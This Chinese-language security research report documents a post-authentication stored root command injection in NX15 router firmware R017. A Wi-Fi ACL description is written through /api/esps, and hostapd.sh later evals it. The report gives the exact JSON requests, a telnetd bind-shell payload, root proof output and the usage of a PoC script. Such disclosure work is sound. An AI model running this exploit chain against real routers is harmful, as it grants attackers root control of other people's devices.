# NX15 R017 `esps.wifi.acl` -> `hostapd.sh` 后置存储型 root RCE

## 1. 结论

在 NX15 R017 上，`/api/esps` 的：

- `object = esps.wifi.acl`
- `method = add` / `modify`

可将攻击者控制的 payload 写入 `wireless_acl.*.description`，随后在 Wi-Fi 配置重载过程中被 `lib/wifi/hostapd.sh` 以 `eval` 执行，形成一条**已实机确认的后认证存储型 root RCE**。

- **接口**：`POST /api/esps`
- **上游对象**：`esps.wifi.acl`
- **上游方法**：`add` / `modify`
- **注入字段**：`description`
- **下游 sink**：`/lib/wifi/hostapd.sh`
- **纯 Web 触发器**：`object = esps.wifi` / `method = setssid`
- **触发方式**：修改现有 SSID 配置（本轮用 `5G / SSID1` 的 `hide` 字段 `disable -> enable`）
- **权限**：后认证（管理员会话）
- **结果**：以 **root** 权限执行任意命令
- **验证设备**：`192.168.8.1`，NX15 firmware `R017`
- **结论等级**：**Confirmed / Exploited**

这条链属于典型的存储型利用：

> **攻击者先把 payload 持久化进 Wi-Fi ACL 配置，再等待一次正常的 Wi-Fi 配置重建动作，由系统自身在 root 上下文中执行。**

因此它具备较强的隐蔽性与延迟触发特征。

---

## 2. 根因分析

目标脚本：

- `/lib/wifi/hostapd.sh`

### 2.1 `wireless_acl.description` 被直接 `eval`

文件开头的 ACL 读取函数：

```sh
wireless_acl_getAllitem()
{
    if [ -n "$(uci_get wireless_acl."$1".id)" ] ;then
        eval wireless_acl_id_list"${idx}"="$(uci_get wireless_acl."$1".id)"
    fi
    if [ -n "$(uci_get wireless_acl."$1".description)" ] ;then
        eval wireless_acl_remark_list"${idx}"="$(uci_get wireless_acl."$1".description)"
    fi
    if [ -n "$(uci_get wireless_acl."$1".macaddr)" ] ;then
        eval wireless_acl_mac_list"${idx}"="$(uci_get wireless_acl."$1".macaddr)"
    fi
    ...
}
```

对应行号：

- `hostapd.sh:23-40`
- 其中危险 sink 位于 **`hostapd.sh:28-29`**

也就是说，只要攻击者能把诸如：

```sh
$(/usr/sbin/telnetd -p2482 -l/bin/sh)
```

写入 `wireless_acl.*.description`，在该函数执行时就会被 shell 命令替换语义直接执行。

### 2.2 这是实际运行路径，不是死代码

在同一文件的 VAP 配置生成流程中：

```sh
#获取列表
idx=1
config_load wireless_acl
config_foreach wireless_acl_getAllitem acl-table
```

对应行号：

- `hostapd.sh:983-986`

这说明只要 hostapd 配置重建 / Wi-Fi reload / 相关无线配置应用发生，就会走到这段 ACL 读取逻辑。

### 2.3 `description` 本身并非 hostapd 所需配置字段

这也是此漏洞很“纯”的原因之一：

- `description` 只是 ACL 备注信息；
- 后续并不需要作为 hostapd 核心配置项输出；
- 但脚本仍然先把它读出来再 `eval`。

因此其根因并非复杂业务链路，而是：

> **对不可信持久化配置字段进行了完全没有必要的 `eval`。**

### 2.4 上游 `esps.wifi.acl` 允许攻击者写入 `description`

运行时对象签名已确认：

```text
'esps.wifi.acl'
    "add":{"radio":"Array","mac":"String","description":"String","isAllowWifi":"String"}
    "modify":{"id":"Integer","mac":"String","description":"String","radio":"Array","isAllowWifi":"String"}
```

因此攻击者可通过 Web 管理接口直接持久化 payload。

---

## 3. 利用链说明

本轮正式闭环的链路如下：

1. 登录 `/api/login/auth` 获取管理员会话；
2. 调用 `esps.wifi.acl.add`，把 payload 写入 `description`；
3. 调用 `esps.wifi.acl.getlist`，确认 payload 已原样存储；
4. 调用 `esps.wifi.getssid` 读取当前 SSID 配置；
5. 调用 `esps.wifi.setssid` 修改一个真实 Wi-Fi 配置项，强制触发 hostapd 配置重建；
6. `hostapd.sh` 在读取 `wireless_acl.description` 时执行 `eval`，拉起 root shell；
7. 通过新开的 telnet 端口验证 root；
8. 删除恶意 ACL 项并恢复原 Wi-Fi 配置，完成清理。

本轮用于落地的最短 payload：

```sh
$(/usr/sbin/telnetd -p2482 -l/bin/sh)
```

该 payload 会在命中 sink 时直接启动一个 root `telnetd`。

---

## 4. 动态验证

### 4.1 初始状态

在恢复后的测试设备上，先确认：

- `esps.wifi.acl.getlist` 返回空列表；
- `5G / SSID1` 的 `hide = disable`；
- `192.168.8.1:2482` 关闭。

### 4.2 写入存储 payload

请求：

```json
[
  {
    "id": 1,
    "object": "esps.wifi.acl",
    "method": "add",
    "param": {
      "radio": ["2.4G", "5G"],
      "mac": "02:11:22:33:44:55",
      "description": "$(/usr/sbin/telnetd -p2482 -l/bin/sh)",
      "isAllowWifi": "false"
    }
  }
]
```

返回：

```json
[{"id":1,"result":{"message":"Success","data":[],"code":0}}]
```

随后读取：

```json
[{"id":2,"result":{"message":"Success","data":{"count":1,"list":[{"mac":"02:11:22:33:44:55","isAllowWifi":"false","description":"$(/usr/sbin/telnetd -p2482 -l/bin/sh)","id":0,"radio":["2.4G","5G"]}]},"code":0}}]
```

说明 payload 已被**原样写入持久化配置**。

### 4.3 纯 Web 触发：`esps.wifi.setssid`

先读取当前 SSID：

```json
[{"id":1,"result":{"message":"Success","data":{"list":[
  {"radio":"2.4G","index":"SSID1","ssid":"H3C_B4D5B0","hide":"disable","auth":"wpa2psk","encrypt":"aes","key":"admin123","keyPeriod":3600,"charset":"utf8","bssid":"","vlan":1,"accessMax":0,"status":"enable","isolation":"disable","curCountryCode":""},
  {"radio":"5G","index":"SSID1","ssid":"H3C_B4D5B0_5G","hide":"disable","auth":"wpa2psk","encrypt":"aes","key":"admin123","keyPeriod":3600,"charset":"utf8","bssid":"","vlan":1,"accessMax":0,"status":"enable","isolation":"disable","curCountryCode":""}
]}}]
```

然后仅修改 `5G / SSID1` 的 `hide`：

```json
[
  {
    "id": 21,
    "object": "esps.wifi",
    "method": "setssid",
    "param": {
      "list": [
        {
          "radio": "5G",
          "index": "SSID1",
          "status": "enable",
          "ssid": "H3C_B4D5B0_5G",
          "charset": "utf8",
          "auth": "wpa2psk",
          "encrypt": "aes",
          "key": "admin123",
          "keyPeriod": 3600,
          "hide": "enable",
          "isolation": "disable",
          "vlan": 1,
          "accessMax": 0,
          "curCountryCode": "",
          "bssid": ""
        }
      ]
    }
  }
]
```

返回：

```json
[{"id":21,"result":{"message":"Success","data":[],"code":0}}]
```

### 4.4 Root shell 证明

`setssid` 返回成功后，`192.168.8.1:2482` 打开。直接连接后得到 BusyBox shell，并验证：

```text
uid=0(root) gid=0(root)
Linux NX15 4.4.176-svn22943 #2 Fri Aug 1 14:14:03 CST 2025 mips GNU/Linux
31339 root      1656 S    /usr/sbin/telnetd -p2482 -l/bin/sh
```

这直接证明：

1. payload 已经在设备上执行；
2. 执行上下文为 **root**；
3. 触发动作完全来自 Web 管理接口，不依赖已有 shell。

---

## 5. 清理与恢复

为避免影响后续测试，本轮在验证成功后立即做了清理：

### 5.1 删除恶意 ACL 条目

请求：

```json
[
  {
    "id": 9,
    "object": "esps.wifi.acl",
    "method": "delbymac",
    "param": {
      "list": ["02:11:22:33:44:55"]
    }
  }
]
```

返回：

```json
[{"id":9,"result":{"message":"Success","data":[],"code":0}}]
```

### 5.2 恢复 5G/SSID1 的 `hide = disable`

再次调用 `esps.wifi.setssid` 把之前切到 `enable` 的 `hide` 恢复为 `disable`，读取回显确认恢复成功。

### 5.3 关闭临时 root telnetd

在已拿到的 shell 中 kill 掉 `/usr/sbin/telnetd -p2482 -l/bin/sh` 后，确认：

- `192.168.8.1:2482` 已关闭；
- `esps.wifi.acl.getlist` 返回：

```json
[{"id":30,"result":{"message":"Success","data":{"count":0,"list":[]},"code":0}}]
```

因此本轮验证结束时，设备已恢复到：

- Wi-Fi ACL 恶意项已删除；
- 5G `hide` 已恢复；
- 临时 shell 端口已关闭。

---

## 6. 影响评估

该漏洞的安全影响为：

- 管理员权限攻击者可获得 **root RCE**；
- payload 可先存储、后触发，具备延迟执行和隐蔽性；
- 触发条件是普通无线配置变更或系统重启等正常运维动作；
- 因为 payload 持久化在配置中，所以即使攻击者暂时失去会话，后续仍可等待管理员或系统自行触发。

可将其归类为：

> **Post-auth stored command injection / stored root RCE**

---

## 7. POC

- `poc/postauth_esps_wifi_acl_hostapd_reload_rce.py`

推荐直接使用已验证的纯 Web 触发方式：

```bash
python3 poc/postauth_esps_wifi_acl_hostapd_reload_rce.py \
  --preclean-mac \
  --trigger setssid-hide-toggle \
  --cleanup-entry \
  --restore-config \
  --kill-telnetd \
  --port 2482
```

若当前 Web 管理密码不是默认 `admin123`，补充：

```bash
--password '<CURRENT_WEB_PASSWORD>'
```

该 PoC 的默认行为是：

1. 登录 Web 管理口；
2. 向 `esps.wifi.acl.add` 写入恶意 `description`；
3. 调用 `esps.wifi.acl.getlist` 确认 payload 已落盘；
4. 通过 `esps.wifi.setssid` 切换指定 SSID 的 `hide` 字段，触发 `hostapd.sh` 配置重建；
5. 连接临时 root shell 端口验证执行结果；
6. 按参数清理 ACL 恶意项、恢复 SSID 配置并关闭临时 `telnetd`。

## 8. 结论

该漏洞已经确认可通过纯 Web 管理面完成完整利用：攻击者把 payload 写入 `wireless_acl.description`，再通过一次正常的 `esps.wifi.setssid` 配置应用触发 `hostapd.sh` 中的 `eval`，最终以 root 身份执行任意命令。
